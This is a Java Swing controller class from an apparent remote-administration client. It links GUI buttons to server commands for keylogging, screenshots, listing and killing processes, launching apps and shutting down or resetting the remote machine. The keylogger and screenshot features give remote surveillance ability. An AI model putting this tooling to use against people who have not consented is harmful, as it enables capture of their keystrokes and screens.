package controller;

import model.Client;
import view.Login;
import view.Home;

import javax.swing.*;
import java.awt.image.BufferedImage;
import java.util.ArrayList;

public class Controller
{
    public Controller(Login login, Home home, Client client)
    {
        initComponents(login, home, client);
    }

    private void initComponents(Login login, Home home, Client client)
    {
        this.login = login;
        this.home = home;
        this.client = client;
    }

    public void initController()
    {
        login.getConnectButton().addActionListener(e -> connectServer());
        // Keylogger
        home.getLogPanel().getHookButton().addActionListener(e -> handleKeyLogger("Hook"));
        home.getLogPanel().getUnHookButton().addActionListener(e -> handleKeyLogger("Unhook"));
        home.getLogPanel().getPrintButton().addActionListener(e -> handleKeyLogger("Print"));

        // ScreenShot
        home.getScreenPanel().getTakeButton().addActionListener(e -> handleScreenShot("ScreenShot", 1));
        home.getScreenButton().addActionListener(e -> handleScreenShot("ScreenShot", 2));

        // Process
        home.getProcessPanel().getStopButton().addActionListener(e -> handleProcess("StopProcess"));
        home.getProcessPanel().getListButton().addActionListener(e -> handleProcess("ListProcess"));

        // App Installer
        home.getAppInstalledPanel().getListButton().addActionListener(e -> handleAppInstalled("ListAppInstalled"));
        home.getAppInstalledPanel().getStartButton().addActionListener(e -> handleAppInstalled("StartAppInstalled"));

        // App Running
        home.getAppRunningPanel().getListButton().addActionListener(e -> handleAppRunning("ListAppRunning"));
        home.getAppRunningPanel().getStopButton().addActionListener(e -> handleAppRunning("StopAppRunning"));

        //  Shutdown
        home.getShutdownButton().addActionListener(e -> handleShutdown("Shutdown"));
        home.getResetButton().addActionListener(e -> handleShutdown("Reset"));
    }

    private void handleShutdown(String command)
    {
        client.sendCommand(command);
        switch (command)
        {
            case ("Shutdown"):
            {
                home.notify("System", "      Shutdown Successfully!      ");
                break;
            }
            case ("Reset"):
            {
                home.notify("System", "      Reset Successfully!      ");
                break;
            }
        }
    }

    private void handleAppRunning(String command)
    {
        client.sendCommand(command);
        switch (command)
        {
            case ("ListAppRunning"):
            {
                ArrayList<ArrayList<String>> infoAppRunning = client.getApplication().listAppRunning();
                home.getAppRunningPanel().updateAppRunningTable(infoAppRunning);
                break;
            }
            case ("StopAppRunning"):
            {
                if (home.getAppRunningPanel().getClickedAppRunning())
                {
                    String IDAppRunning = home.getAppRunningPanel().getClickedAppRunningID();
                    String NameAppRunning = home.getAppRunningPanel().getClickedAppRunningName();
                    String notifyStopStatus = client.getApplication().stopAppRunning(IDAppRunning);

                    switch (notifyStopStatus)
                    {
                        case "1":
                        {
                            home.notify("Application", "      " + NameAppRunning + " (" + IDAppRunning + ") has been stopped      ");
                            break;
                        }
                        case "0":
                        {
                            home.notify("Application", "      There is no " + NameAppRunning + " (" + IDAppRunning + ") is running      ");
                            break;
                        }
                    }
                    handleAppRunning("ListAppRunning");
                }
                else
                {
                    home.notify("Application", "      You haven't chosen application!      ");
                }
                break;
            }
        }
    }

    private void handleAppInstalled(String command)
    {
        client.sendCommand(command);
        switch (command)
        {
            case ("ListAppInstalled"):
            {
                ArrayList<ArrayList<String>> infoAppInstalled = client.getApplication().listAppInstalled();
                home.getAppInstalledPanel().updateAppInstalledPanel(infoAppInstalled);
                break;
            }

            case ("StartAppInstalled"):
            {
                if (home.getAppInstalledPanel().getStartClicked())
                {
                    String appDirectory = home.getAppInstalledPanel().getClickedAppDirectory();
                    if (appDirectory == null)
                    {
                        return;
                    }
                    String status = client.getApplication().startApp(appDirectory).trim();
                    System.out.println(status);

                    if (status.equals("1"))
                    {
                        home.notify("Application", "      Start " + home.getAppInstallPanel().getClickedAppName() + " Successfully!      ");
                    }
                    else
                    {
                        home.notify("Application", "      Error      ");
                    }
                }
                else
                {
                    home.notify("Application", "      You haven't chosen application!      ");
                }

                break;
            }
        }
    }

    private void handleProcess(String command)
    {
        client.sendCommand(command);
        switch (command)
        {
            case ("ListProcess"):
            {
                ArrayList<ArrayList<String>> infoProcess = client.getProcess().listProcess();
                home.getProcessPanel().updateProcessTable(infoProcess);
                break;
            }

            case ("StopProcess"): {
                String IDProcess = home.getProcessPanel().getClickedProcessID().trim();
                String NameProcess = home.getProcessPanel().getClickedProcessName().trim();
                String notifyStopStatus = client.getProcess().stopProcess(IDProcess);
                notifyStopStatus = notifyStopStatus.trim();
                try {
                    Thread.sleep(1500);
                } catch (InterruptedException iE) {
                    //
                }

                switch (notifyStopStatus)
                {
                    case "1":
                    {
                        home.notify("Process", "      " + NameProcess + " (" + IDProcess + ") has been stopped      ");
                        break;
                    }
                    case "0":
                    {
                        home.notify("Process", "      There is no " + NameProcess + " (" + IDProcess + ") is running      ");
                        break;
                    }
                }

                handleProcess("ListProcess");
                break;
            }
        }
    }

    private void handleScreenShot(String command, int type)
    {
        if (type == 2 && !firstTakeScreen)
        {
            return;
        }

        BufferedImage image = client.handleScreenShot(command);
        int currentFileName = client.getScreenShot().getCurrentFileName();
        home.getScreenPanel().addImageLabel(image);
        home.notify("Screenshot", "   Screenshot has been saved as \"screenshot" + Integer.toString(currentFileName) + ".jpg   ");

        client.getScreenShot().setCurrentFileName(currentFileName + 1);

        firstTakeScreen = false;
    }
    private void handleKeyLogger(String command)
    {
        String keylogger = client.handleKeyLogger(command);

        switch (command)
        {
            case "Hook":
            {
                home.getLogPanel().getHookButton().setForeground(new java.awt.Color(40, 50, 65));
                home.getLogPanel().getHookButton().setBackground(new java.awt.Color(130, 197, 190));
                home.getLogPanel().setHook(true);
                break;
            }
            case "Unhook":
            {
                home.getLogPanel().getHookButton().setBackground(new java.awt.Color(40, 50, 65));
                home.getLogPanel().getHookButton().setForeground(new java.awt.Color(130, 197, 190));
                home.getLogPanel().setHook(false);
                int fileName = client.getKeylogger().getCurrentFileName();
                home.notify("Keylogger", "      Keylogging has been saved as \"keylog" + Integer.toString(fileName) +".txt\"!      ");
                client.getKeylogger().setCurrentFileName(fileName + 1);
                break;
            }
        }

        home.getLogPanel().getKeyTextArea().setText(keylogger);
    }

    private void connectServer()
    {
        client.setIP(login.getIpTextField().getText());
        String status = client.createSocket();

        if (status.equals("Success"))
        {
           login.setVisible(false);
           home.setVisible(true);
           return;
        }

        login.getStatusLabel().setText(status);
        login.getIpTextField().setText("");
    }

    private Login login;
    private Home home;
    private Client client;
    private Boolean firstTakeScreen = true;
}
